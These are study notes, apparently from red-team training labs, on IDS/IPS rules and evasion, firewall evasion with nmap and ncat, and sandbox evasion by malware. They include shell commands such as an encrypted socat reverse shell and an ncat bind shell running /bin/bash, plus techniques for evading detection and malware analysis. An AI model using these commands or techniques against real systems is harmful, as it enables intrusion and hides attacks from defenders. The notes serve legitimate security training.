## Network Security Solutions

### --------------------------------- Introduction -----------------------------------

### **IDS vs IPS**

- **IDS:** Detects intrusions and generates alerts but doesn't block them.
- **IPS:** Detects and blocks intrusions.

**Snort:** Can work as IDS or IPS. IPS mode requires **inline mode** to drop malicious traffic.

### **Types of IDS**

- **HIDS:** Installed on a host; monitors its processes and incoming/outgoing traffic.
- **NIDS:** Monitors network traffic across networks/VLANs, usually through a switch monitor (SPAN) port.

**Remember:** HIDS = Individual host. NIDS = Entire network.


### --------------------------------- IDS Engine Types -----------------------------------

### **IDS Engine Types**

Network traffic is either **Benign (normal)** or **Malicious (abnormal)**.

IDS detection engines have two types:

**1. Signature-based**

- Detects known malicious patterns using predefined rules/signatures.
- Example: Antivirus detecting known virus signatures.
- Unknown attacks may go undetected.

**2. Anomaly-based**

- Learns normal traffic behavior (baseline).
- Detects activity that deviates from normal.
- Uses machine learning or manual rules.

**Remember:**

- Signature-based = Knows what is malicious.
- Anomaly-based = Knows what is normal.


### --------------------------------- IDS/IPS Rule Triggering -----------------------------------

Snort rule format:

`Rule Header (Rule Options)`

**Rule Header:** Action, Protocol, Source IP/Port, Direction, Destination IP/Port.

- Action: `alert`, `log`, `pass`, `drop`, `reject`
- Protocol: `TCP`, `UDP`, `ICMP`, `IP`
- `!` = NOT
- `->` = One-way traffic
- `<>` = Bidirectional traffic

**Example:**

```
drop icmp any any -> any any (msg:"ICMP Ping Scan"; dsize:0; sid:1000020; rev:1;)
```

Drops matching ICMP packets.

**Rule Options:**

- `msg` = Alert message
- `content` = Search for specific packet content
- `sid` = Rule ID
- `rev` = Rule revision
- `flow:established` = Established TCP connection
- `to_server` = Traffic going to server
- `nocase` = Case-insensitive matching
- `http_method` = Match HTTP method

**Detecting&#x20;**`ncat`**:**

```
alert tcp any any <> any 80 (msg:"Netcat Exploitation"; content:"ncat"; sid:1000030; rev:1;)
```

Hexadecimal content matching:

```
content:"|6e 63 61 74|";
```

`ncat` in hexadecimal = `6e 63 61 74`.

**Detecting ncat in HTTP POST requests:**

```
alert tcp any any <> any 80 (msg:"Netcat Exploitation"; flow:established,to_server; content:"POST"; nocase; http_method; content:"ncat"; nocase; sid:1000032; rev:1;)
```

**Limitation:** Signature-based IDS detects known patterns. Even small changes to the attack payload can bypass a poorly written signature.

**Remember:** Detection depends on how accurate and updated the rules are.


### --------------------------------- Evasion via Protocol Manipulation -----------------------------------

### **Evasion via Protocol Manipulation**

**Goal:** Change network traffic so it doesn't match signature-based IDS/IPS rules.

Four general IDS/IPS evasion methods:

1. Protocol manipulation
2. Payload manipulation
3. Route manipulation
4. Tactical DoS

<img width="904" height="344" alt="image" src="https://github.com/user-attachments/assets/b07cb6bf-7278-441f-9a2c-8fee6c89b703" />

### **1. Use a Different Protocol**

<img width="744" height="464" alt="image" src="https://github.com/user-attachments/assets/e2cf60b2-7d19-499e-9b0f-5a04c311bc86" />

Use a protocol allowed by the network instead of a blocked one. Example: UDP instead of TCP, or HTTPS instead of HTTP.

**Ncat TCP:**

```
ncat -lvnp PORT
ncat TARGET_IP PORT
```

**Ncat UDP:**

```
ncat -ulvnp PORT
ncat -u TARGET_IP PORT
```

Options: `-l` listen, `-v` verbose, `-n` no DNS resolution, `-p` port, `-u` UDP. TCP is the default.

### **2. Manipulate Source Ports**

Port numbers can make traffic appear to use a different service.

**Nmap:**

```
nmap -sS -Pn -g 80 -F MACHINE_IP
nmap -sU -Pn -g 53 -F MACHINE_IP
```

- `-g` / `--source-port` = Set source port.
- Port 80 = HTTP-like traffic.
- Port 53 = DNS-like traffic.

**Ncat examples:**

```
ncat -ulvnp 53
ncat -u ATTACKER_IP 53

ncat -lvnp 80
nc ATTACKER_IP 80
```

### **3. Session Splicing (IP Fragmentation)**

Split packets into smaller fragments so signatures may not match unless the IDS reassembles them.

**Nmap:**

```
-f          # 8-byte fragments
-ff         # Maximum 16-byte fragments
--mtu SIZE  # Custom size (multiple of 8)
```

**Fragroute:**

```
# fragroute.conf
ip_frag 16

fragroute -f fragroute.conf HOST
```

Tool: [Fragroute](https://www.monkey.org/~dugsong/fragroute/?utm_source=chatgpt.com)

### **4. Sending Invalid Packets**

Send malformed packets that IDS and target systems may process differently.

**Nmap:**

```
--badsum
--scanflags SYNRSTFIN
```

- `--badsum` = Invalid TCP/UDP checksum.
- `--scanflags` = Set custom TCP flags.

TCP flags: `URG`, `ACK`, `PSH`, `RST`, `SYN`, `FIN`.

**Hping3 options:**

- `-t` = Set TTL.
- `-b` = Bad checksum.
- `-S` = SYN
- `-A` = ACK
- `-P` = PUSH
- `-U` = URG
- `-F` = FIN
- `-R` = RST

**Remember:** Protocol manipulation changes how traffic looks to security systems, potentially bypassing weak detection rules.


### --------------------------------- Evasion via Payload Manipulation -----------------------------------

### **Evasion via Payload Manipulation**

Three methods:

1. **Obfuscation/Encoding:** Change payload format to bypass signatures.
2. **Encryption:** Hide communication content from traffic inspection.
3. **Data modification:** Change commands or use alternatives.

#### **1. Obfuscate and Encode**

Common encoding methods:

| Method         | Purpose                               |
| -------------- | ------------------------------------- |
| Base64         | Converts data into Base64 text        |
| URL encoding   | Converts characters into `%HH` format |
| Unicode escape | Converts characters into `\uXXXX`     |

Example:

```
base64 input.txt
urlencode "ncat -lvnp 1234 -e /bin/bash"
```

Unicode encoding tool: [CyberChef](https://gchq.github.io/CyberChef/?utm_source=chatgpt.com)

Encoding is reversible, not encryption. It only helps when IDS signatures don't recognize the transformed payload.

#### **2. Encrypt Communication**

Encryption hides exchanged commands and data from network inspection. It requires a key/certificate.

**Create certificate and key:**

```
openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt

cat thm-reverse.key thm-reverse.crt > thm-reverse.pem
```

**Encrypted connection:**

```
socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
socat OPENSSL:TARGET_IP:4443,verify=0 EXEC:/bin/bash
```

Important options:

- `OPENSSL-LISTEN`: Encrypted listener.
- `cert`: Certificate and private key.
- `verify=0`: Disables peer certificate verification.
- `fork`: Handles multiple connections.
- `EXEC`: Executes a program.

**Encrypted vs unencrypted traffic:**

- Encrypted: Wireshark cannot directly read exchanged commands.
- Unencrypted: Commands are visible and TCP streams can be followed.

#### **3. Modify Data**

Small changes can bypass simple signatures:

- Change command argument order.
- Add extra spaces.
- Use alternatives such as `nc` or `socat` instead of `ncat`.
- Use encoding if the target application can decode it.

**Key takeaway:** Payload manipulation changes what IDS signatures see. Encryption hides traffic content, while command modification makes exact signature matching harder.


### --------------------------------- Evasion via Route Manipulation -----------------------------------

### **Evasion via Route Manipulation**

Two methods: **Source routing** and **Proxy servers**.

#### **1. Source Routing**

Forces packets to follow a specified route using Nmap `--ip-options`.

- **Loose routing (**`L`**):** Specifies some hops; other hops are decided by routers.
- **Strict routing (**`S`**):** Specifies every hop.

```
# Loose routing
nmap --ip-options "L 10.10.10.50 10.10.50.250" TARGET_IP

# Strict routing
nmap --ip-options "S 10.10.10.1 10.10.20.2 10.10.30.3" TARGET_IP
```

Many routers ignore or block source-routed packets.

#### **2. Proxy Servers**

Routes traffic through proxy servers to hide the original source IP.

Nmap supports HTTP and SOCKS4 proxies using `--proxies`.

```
nmap -sS --proxies HTTP://PROXY1:8080,SOCKS4://PROXY2:4153 TARGET_IP
```

- Format: `proto://host:port`
- Multiple proxies can be comma-separated.
- Authentication is not supported.
- Proxy reliability may vary.

**Key takeaway:** Source routing controls packet paths; proxies route traffic through intermediary servers, making the proxy appear as the source.


### --------------------------------- Evasion via Tactical DoS -----------------------------------

### **Evasion via Tactical DoS**

Two targets:

1. **IDS/IPS:** Overload processing capacity with huge amounts of benign traffic.
2. **Logging Server:** Flood logs until disk space or network capacity is exhausted.

**Alert fatigue:** Too many false positives overwhelm SOC analysts, potentially hiding real attacks.

**Key takeaway:** Tactical DoS weakens detection by overloading IDS/IPS, logging systems, or their operators.


### --------------------------------- C2 and IDS/IPS Evasion -----------------------------------

### **C2 and IDS/IPS Evasion**

C2 frameworks like **Cobalt Strike** and **Empire** support custom malleable C2 profiles to change communication patterns and avoid detection.

Important settings:

- **User-Agent:** Changes the HTTP client identity.
- **Sleep Time:** Controls the interval between beacon check-ins.
- **Jitter:** Adds randomness to sleep time (e.g., 30% = ±30%).
- **SSL Certificate:** Uses a certificate for encrypted communication.
- **DNS Beacon:** Controls DNS servers and query hostnames used in DNS communication.

Example: [Cobalt Strike Malleable C2 Profile](https://github.com/bigb0sss/RedTeam-OffensiveSecurity/blob/master/01-CobaltStrike/malleable_C2_profile/CS4.0_guideline.profile?utm_source=chatgpt.com)




## Firewalls

### --------------------------------- Introduction -----------------------------------

A **firewall** monitors network traffic and allows or blocks it based on predefined rules. It acts like a gatekeeper.

**Basic fields a firewall checks:**

- IP Header: Protocol, Source IP, Destination IP.
- TCP/UDP Header: Source Port, Destination Port.

**Common protocols:** TCP, UDP, ICMP.

**Key takeaway:** A firewall controls network traffic using IP addresses, protocols and port numbers.


### --------------------------------- Types of Firewalls -----------------------------------

### **Types of Firewalls**

**By deployment:**

- **Hardware:** Separate appliance (e.g., Cisco ASA, pfSense).
- **Software:** Runs on an OS (e.g., Windows Defender Firewall, iptables, firewalld).

**By protection scope:**

- **Personal:** Protects home networks or individual systems.
- **Commercial:** Protects medium-to-large organizations.

**By inspection capability:**

| Type                   | Main function                                                        |
| ---------------------- | -------------------------------------------------------------------- |
| Packet Filtering       | Checks IPs, protocols and ports; stateless.                          |
| Circuit-Level Gateway  | Checks TCP connection handshake.                                     |
| Stateful Inspection    | Tracks established TCP sessions.                                     |
| Proxy Firewall         | Inspects packet payloads; acts on behalf of clients.                 |
| NGFW                   | Inspects OSI Layers 2–7; provides application awareness and control. |
| Cloud Firewall (FWaaS) | Cloud-based firewall with scalable protection.                       |

<img width="1150" height="700" alt="image" src="https://github.com/user-attachments/assets/69113c12-11f9-4e48-9360-c4bbfd247939" />

**Examples:**

- NGFW: Cisco Firepower, Juniper SRX.
- Cloud: Cloudflare Magic Firewall, Juniper vSRX.
- AWS: WAF protects web applications; Shield protects against DDoS.

**Key takeaway:** The more OSI layers a firewall can inspect, the more advanced its protection and the more processing power it needs.


### --------------------------------- Evasion via Controlling the Source MAC/IP/Port -----------------------------------

Nmap techniques:

1. Decoys
2. Proxy
3. Spoofed MAC
4. Spoofed IP
5. Fixed source port

**Default SYN scan:**

```
nmap -sS -Pn -F MACHINE_IP
```

- `-sS`: SYN scan.
- `-Pn`: Skip host discovery.
- `-F`: Scan top 100 common ports.
- IP packet: **44 bytes** (20-byte IP header + 24-byte TCP header).
- TCP data: **0 bytes**.
- Approximately **200 packets**.

#### **1. Decoys (**`-D`**)**

Mix real IP with fake IPs.

```
# Specific decoys
nmap -sS -Pn -D 10.10.10.1,10.10.10.2,ME -F MACHINE_IP

# Random decoys
nmap -sS -Pn -D RND,RND,ME -F MACHINE_IP
```

`ME` = real IP, `RND` = random IP.

#### **2. Proxy (**`--proxies`**)**

Routes scan through a proxy. Target sees the proxy IP.

```
nmap -sS -Pn --proxies 10.10.13.37 -F MACHINE_IP
```

#### **3. Spoofed MAC (**`--spoof-mac`**)**

Changes source MAC address. Works only on the same network segment.

```
nmap --spoof-mac MAC_ADDRESS MACHINE_IP
```

#### **4. Spoofed IP (**`-S`**)**

Changes source IP. Replies go to the spoofed address.

```
nmap -S 10.10.0.254 MACHINE_IP
```

#### **5. Fixed Source Port (**`-g`**)**

Sets a specific source port instead of a random port.

```
# TCP source port 8080
nmap -sS -Pn -g 8080 -F MACHINE_IP

# UDP source port 53
nmap -sU -F -g 53 MACHINE_IP
```

**Remember:** `-D` decoys, `--proxies` proxy, `--spoof-mac` MAC, `-S` IP, `-g` port.


### --------------------------------- Evasion via Forcing Fragmentation, MTU, and Data Length -----------------------------------

### **Evasion via Fragmentation, MTU and Data Length**

These Nmap options change packet size to make firewall/IDS inspection harder.

#### **1. Fragment into 8 Bytes (**`-f`**)**

```
nmap -sS -Pn -f -F MACHINE_IP
```

- IP data is divided into 8-byte fragments.
- TCP header (24 bytes) becomes 3 fragments.
- IP packet size: `20 + 8 = 28 bytes`.

#### **2. Fragment into 16 Bytes (**`-ff`**)**

```
nmap -sS -Pn -ff -F MACHINE_IP
```

- Maximum IP data: 16 bytes.
- TCP header becomes 2 fragments (16 + 8).
- Maximum IP packet size: `20 + 16 = 36 bytes`.

#### **3. Set MTU (**`--mtu`**)**

```
nmap -sS -Pn --mtu 8 -F MACHINE_IP
```

- Controls IP data size per fragment.
- Value must be a multiple of 8.
- IP header is not included in the MTU value.
- `--mtu 8` is equivalent to `-f`.

#### **4. Specific Data Length (**`--data-length`**)**

```
nmap -sS -Pn --data-length 64 -F MACHINE_IP
```

Adds random data to packets to change their size. Value should be a multiple of 8.

### **Quick Revision**

| Option              | Function               |
| ------------------- | ---------------------- |
| `-f`                | 8-byte fragments       |
| `-ff`               | 16-byte fragments      |
| `--mtu VALUE`       | Set fragment data size |
| `--data-length NUM` | Add random packet data |


### --------------------------------- Evasion via Modifying Header Fields -----------------------------------

### **Evasion via Modifying Header Fields**

Nmap can modify IP/TCP header fields to change how packets are handled.

#### **1. Set TTL (**`--ttl`**)**

Sets a custom IP Time-to-Live value.

```
nmap -sS -Pn --ttl 81 -F MACHINE_IP
```

Lab tasks:

- Scan with `--ttl 1` → Check open ports.
- Scan with `--ttl 2` → Check open ports.

#### **2. Set IP Options (**`--ip-options`**)**

Controls the IP Options field.

```
nmap --ip-options HEX_STRING MACHINE_IP
```

Shortcuts:

| Option | Meaning                  |
| ------ | ------------------------ |
| `R`    | Record route             |
| `T`    | Record timestamp         |
| `U`    | Record route + timestamp |
| `L`    | Loose source routing     |
| `S`    | Strict source routing    |

#### **3. Wrong Checksum (**`--badsum`**)**

Sends packets with intentionally incorrect TCP/UDP checksums.

```
nmap -sS -Pn --badsum -F MACHINE_IP
```

Systems may drop packets with invalid checksums. In the example, all 100 ports appeared **filtered**.

### **Quick Revision**

| Option                 | Function               |
| ---------------------- | ---------------------- |
| `--ttl VALUE`          | Set IP TTL             |
| `--ip-options OPTIONS` | Modify IP options      |
| `--badsum`             | Send invalid checksums |


### --------------------------------- Evasion Using Port Hopping -----------------------------------

Three common firewall evasion techniques:

1. Port hopping
2. Port tunneling
3. Using non-standard ports

**Port hopping:** An application tries different ports until it finds one allowed by the firewall. It can also switch ports during an active communication to make traffic harder to track.

#### **Ncat Commands**

Start a listener:

```
ncat -lvnp 1025
```

Connect to a port:

```
ncat ATTACKBOX_IP 1025
```

**Key takeaway:** Port hopping changes communication ports to find allowed paths or make traffic harder to track.


### --------------------------------- Evasion Using Port Tunneling -----------------------------------

**Port tunneling** (port forwarding/mapping) forwards traffic from one destination port to another.

Example: Traffic arriving at port `443` is forwarded to port `25`.

#### **Ncat Port Tunneling**

```
ncat -lvnp 443 -c "ncat TARGET_SERVER 25"
```


### --------------------------------- Evasion Using Non-Standard Ports -----------------------------------

Non-standard ports are used to run services on ports other than their usual default ports.

Ncat example:

```
ncat -lvnp PORT_NUMBER -e /bin/bash
```

**Key takeaway:** Non-standard ports can make services harder to recognize, but firewall rules still determine whether connections are allowed.


### --------------------------------- Next-Generation Firewalls -----------------------------------

Traditional firewalls rely mainly on port numbers to identify applications. However, modern applications can use unusual ports and encryption, making port-based filtering unreliable.

**NGFW capabilities:**

- **Integrated IPS:** Detects and blocks threats in real time.
- **User Identification:** Applies security policies per user or group.
- **Application Identification:** Recognizes applications regardless of port.
- **Content Inspection:** Inspects transmitted content and enforces policies.
- **Traffic Decryption:** Can inspect SSL/TLS and SSH traffic.

**Key takeaway:** NGFW provides advanced protection by inspecting users, applications, protocols and content instead of relying only on IP addresses and ports.





## Sandbox Evasion

### --------------------------------- An Adversary walks into a Sandbox -----------------------------------

### **An Adversary Walks into a Sandbox**

**Malware Analysis:** Examining suspicious files to understand their behavior and develop detections.

#### **Static vs Dynamic Analysis**

- **Static Analysis:** Examines code without executing it (IDA, Ghidra).
- **Dynamic Analysis:** Executes malware and monitors its behavior (ProcMon, Sysmon, EDR, debuggers).

#### **Sandbox**

A sandbox is an isolated virtualized/containerized environment used to safely execute and monitor suspicious files.

<img width="1261" height="422" alt="image" src="https://github.com/user-attachments/assets/2170eddf-d029-4516-8ba6-1f03391b3c5f" />

**Where sandboxes are used:**

- Firewalls: Monitor network communication.
- Mail servers: Detect malicious email attachments and downloads.
- Workstations: Monitor malicious behavior and system changes.

#### **Popular Sandbox Tools**

| Tool               | Purpose         |
| ------------------ | --------------- |
| Palo Alto WildFire | Firewall        |
| Proofpoint TAP     | Email           |
| Falcon Sandbox     | EDR/Workstation |
| Mimecast           | Email           |
| VirusTotal         | Sample analysis |
| Any.Run            | Sample analysis |
| Antiscan.me        | Sample analysis |
| Joe Sandbox        | Sample analysis |

**Key takeaway:** Static analysis examines code; dynamic analysis observes execution. Sandboxes provide an isolated environment for dynamic malware analysis.


### --------------------------------- Common Sandbox Evasion Techniques -----------------------------------

### **Common Sandbox Evasion Techniques**

Four categories of sandbox evasion:

#### **1. Sleeping Through Sandboxes**

- Sandboxes have limited execution time.
- Malware delays execution to outlast the sandbox.
- Can use timers or time-consuming calculations (e.g., Fibonacci).
- Sandboxes may manipulate built-in sleep functions.

Links: [Checkpoint](https://evasions.checkpoint.com/src/Evasions/techniques/timing.html?utm_source=chatgpt.com) | [Joe Security](https://www.joesecurity.org/blog/660946897093663167?utm_source=chatgpt.com)

#### **2. Geolocation**

- Checks the system's public IP and location.
- Sandbox IPs may belong to antivirus providers or hosting companies.
- Requires internet access.

Tools:

- [https://ifconfig.me](https://ifconfig.me?utm_source=chatgpt.com)
- [https://rdap.arin.net/registry/ip/1.1.1.1](https://rdap.arin.net/registry/ip/1.1.1.1?utm_source=chatgpt.com)

#### **3. Checking System Information**

Sandboxes often have limited resources compared to normal workstations.

Information to check:

- CPU cores, RAM and disk size.
- Hostname and current user.
- BIOS/UEFI information.
- OS version and product key.
- Network adapters.
- Virtualization status.

#### **4. Querying Network Information**

Checks whether the machine belongs to the expected Active Directory domain.

Useful AD information:

- Computers and users.
- Groups, Domain Admins and Enterprise Admins.
- Domain Controllers.
- Service accounts.
- DNS servers.
- Last user logins.

Environment variables:

```
echo %LogonServer%
echo %LogonUserSid%
echo %LogonDomain%
set
```

### **Dropper Preparation**

The lab uses a basic dropper that downloads raw shellcode from `/index.raw` and executes it in memory.

Important requirements:

- Shellcode format: Raw.
- Architecture: 64-bit.
- Source file: `dropper.cpp`.
- Compiler: Visual Studio 2019 or above.
- Build: 64-bit Release.

**Key takeaway:** Sandbox evasion checks execution time, geographic location, system resources and domain/network information to distinguish analysis environments from real systems.


### --------------------------------- Implementing Various Evasion Techniques -----------------------------------

### **Implementing Various Evasion Techniques**

Four sandbox evasion techniques demonstrated:

#### **1. Sleep Delay**

- Sandboxes have execution time limits.
- Delaying execution may cause the sandbox to stop monitoring before the program runs.
- Example: `Sleep(120000)` = 2 minutes.
- Heavy calculations can also consume time.

#### **2. Geolocation Filtering**

- Checks the public IP using `ifconfig.me/ip`.
- Compares the returned IP with the expected victim IP.
- Requires internet access.
- Can trigger sandbox detection, so use carefully.

#### **3. System Information – RAM Check**

Windows API: `GlobalMemoryStatusEx`

- Uses `MEMORYSTATUSEX` structure.
- `ullTotalPhys` contains total physical RAM in bytes.
- Divide by `1024` three times to get GiB.
- Lab example: Continue only if RAM is at least 5 GiB.

#### **4. Active Directory Check**

Windows API: `NetGetDCName`

- Retrieves the domain controller name.
- A domain controller's presence can indicate a corporate environment.
- Requires `Netapi32.lib` in Visual Studio.

**Visual Studio:** Project Properties → Linker → Input → Additional Dependencies → `Netapi32.lib`.

### **Important APIs and Concepts**

| API / Function             | Purpose                          |
| -------------------------- | -------------------------------- |
| `Sleep()`                  | Delays execution                 |
| `URLOpenBlockingStreamA()` | Reads data from a URL            |
| `GlobalMemoryStatusEx()`   | Retrieves system memory          |
| `NetGetDCName()`           | Retrieves domain controller name |

**Key takeaway:** The lab demonstrates four checks: execution time, public IP, system RAM and Active Directory presence. These checks can help distinguish sandbox environments from real systems, but can also produce false positives.


### --------------------------------- DIY Sandbox Evasion Challenge -----------------------------------

### **DIY Sandbox Evasion Challenge**

**Goal:** Build a 64-bit executable that passes all four checks in `SandboxChecker.exe`.

#### **Required Checks**

1. **Active Directory Check:** Detect whether the machine is joined to an AD domain using `NetGetDCName()`.
2. **Memory Check:** Verify system RAM is greater than 1 GB using `GlobalMemoryStatusEx()`.
3. **Network Check:** Implement an outbound HTTP request to `10.10.10.10`.
4. **Sleep Check:** Add a 60-second delay before retrieving the payload.

#### **Testing**

Checker location:

```
C:\Users\Administrator\Desktop\Materials\SandboxChecker.exe
```

Run:

```
SandboxChecker.exe C:\Users\TryHackMe\Materials\SandboxEvasion.exe
```

Expected output:

```
[+] Memory Check found!
[+] Network Check found!
[+] GeoFilter Check found!
[+] Sleep Check found!
Congratulations! Here is your flag:
```

#### **Important Notes**

- All four checks must be implemented correctly.
- The checker analyzes the executable for the required checks.
- Internet access is not required for the network check to pass; implementing the request is sufficient.
- Allow approximately 60 seconds for the sleep check.
- Pay attention to the string comparison in the AD check:

```
dcNewName.find("\\\\")
```

**Key takeaway:** Combine AD detection, RAM checking, outbound HTTP request and a 60-second delay to complete the challenge.


